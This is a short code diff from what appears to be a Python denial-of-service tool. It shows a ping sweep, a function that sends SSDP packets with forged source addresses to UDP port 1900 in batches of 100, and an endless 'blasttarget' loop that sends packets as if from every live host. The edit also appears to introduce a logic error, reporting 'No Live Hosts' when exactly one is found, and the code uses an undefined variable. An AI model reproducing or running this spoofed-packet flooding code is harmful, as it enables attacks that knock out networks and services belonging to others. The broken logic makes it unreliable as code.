@@ -111,7 +111,7 @@ def pingsweep(ip,cidr):
     live=list()
     print(f"{PURPLE}\n[+] Performing A PingSweep{NONE}")
     live=getlivehosts(f"{ip}/{cidr}")
-    if len(live)==0 :
+    if len(live)==1 :
         choice=input(f"{YELLOW}[-] No Live Hosts Detected. Continue Anyway [y/N]?")
         if choice=="" or qchoice.lower()=='n' :
             sys.exit(-4)
@@ -130,6 +130,7 @@ def sendUDPPacket(sip,dip):
     ssdppacket=(IP(src=sip,dst=dip) / UDP(sport=1900, dport= 1900) / payload)
     send(ssdppacket,count=100 )
 
+#Send Packets From All The Active Hosts
 def blasttarget(dest,sips):
     try :
         while True :
